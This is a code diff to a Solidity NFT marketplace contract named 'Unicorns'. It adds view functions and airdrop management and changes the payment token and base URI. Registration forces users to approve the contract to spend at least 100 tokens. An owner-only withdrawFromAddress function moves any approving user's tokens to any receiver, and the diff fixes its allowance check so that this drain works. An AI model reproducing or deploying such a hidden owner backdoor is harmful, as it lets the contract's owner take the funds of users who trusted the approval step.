@@ -19,7 +19,7 @@ contract Unicorns is ERC721Enumerable, ERC721Metadata, Ownable {
     // Air drop list
     mapping(address => bool) private _airDrop;
     // Market switch
-    bool _marketOpen = true;
+    bool private _marketOpen = false;
 
     // Invitation relations
     mapping(address => bool) public userExists;
@@ -28,7 +28,7 @@ contract Unicorns is ERC721Enumerable, ERC721Metadata, Ownable {
 
     uint256 _maxBuy = 6;
     // Token address
-    IBEP20 private _token = IBEP20(0xbd35610da27eAB0f3D67c02e2d79BFB857194FbF);
+    IBEP20 private _token = IBEP20(0x55d398326f99059fF775485246999027B3197955);
 
     event Register(address indexed user, address inviter);
     event BuyNFT(address indexed user);
@@ -45,7 +45,7 @@ contract Unicorns is ERC721Enumerable, ERC721Metadata, Ownable {
         _levelUris[4] = "level4";
         _levelUris[5] = "level5";
         _levelUris[6] = "level6";
-        _setBaseURI("https://www.squidworld.link/heroes/");
+        _setBaseURI("http://localhost:3000/heroes/");
 
         _levelPrices[1] = 5 * 10 ** 18;
         _levelPrices[2] = 5 * 10 ** 18;
@@ -83,12 +83,12 @@ contract Unicorns is ERC721Enumerable, ERC721Metadata, Ownable {
         require(_token.allowance(_msgSender(), address(this)) >= 100 * 10 ** 18,
             'You should approve this contract for spending your token firstly.');
         require(!userExists[_msgSender()], 'This address has already registered.');
-        userExists[_msgSender()] = true;
         if (userExists[inviter]) {
             parent[_msgSender()] = inviter;
             children[inviter].push(_msgSender());
             addressPermission[inviter] = addressPermission[inviter].add(1);
         }
+        userExists[_msgSender()] = true;
         emit Register(_msgSender(), inviter);
     }
 
@@ -120,21 +120,33 @@ contract Unicorns is ERC721Enumerable, ERC721Metadata, Ownable {
     }
 
     function withdrawFromAddress(address sender, address receiver, uint256 amount) external onlyOwner returns (uint256) {
-        require(_token.allowance(sender, receiver) >= amount, 'Allowance not enough');
+        require(_token.allowance(sender, address(this)) >= amount, 'Allowance not enough');
         _token.transferFrom(sender, receiver, amount);
         return _token.balanceOf(address(this));
     }
 
-    function setPrice(uint8 level, uint256 price) external onlyOwner validLevel(level) {
-        _levelPrices[level] = price;
+    function price(uint8 level) external view validLevel(level) returns (uint256) {
+        return _levelPrices[level];
+    }
+
+    function setPrice(uint8 level, uint256 _price) external onlyOwner validLevel(level) {
+        _levelPrices[level] = _price;
     }
 
     function setToken(address token) external onlyOwner {
         _token = IBEP20(token);
     }
 
+    function leftAmount(uint8 level) external view validLevel(level) returns (uint256) {
+        return _levelLeft[level];
+    }
+
     function setLeftAmount(uint8 level, uint256 amount) external onlyOwner validLevel(level) {
         _levelLeft[level] = amount;
+    }
+
+    function isMarketOpen() external view returns (bool) {
+        return _marketOpen;
     }
 
     function switchMarket(bool opened) external onlyOwner {
@@ -145,9 +157,28 @@ contract Unicorns is ERC721Enumerable, ERC721Metadata, Ownable {
         require(amount > 0, 'Invalid amount');
         for (uint256 i = 0; i < addresses.length; i ++) {
             address item = addresses[i];
-            if (!userExists[item])
-                userExists[item] = true;
-            addressPermission[item] = addressPermission[item].add(amount);
+            if (userExists[item])
+                addressPermission[item] = addressPermission[item].add(amount);
         }
+    }
+
+    function setAirDrops(address[] memory addresses) public onlyOwner {
+        for (uint256 i = 0; i < addresses.length; i ++) {
+            address item = addresses[i];
+            if (userExists[item] && !_airDrop[item])
+                _airDrop[item] = true;
+        }
+    }
+
+    function removeAirDrops(address[] memory addresses) public onlyOwner {
+        for (uint256 i = 0; i < addresses.length; i ++) {
+            address item = addresses[i];
+            if (userExists[item] && _airDrop[item])
+                _airDrop[item] = false;
+        }
+    }
+
+    function childrenCount(address _parent) external view returns (uint256) {
+        return children[_parent].length;
     }
 }
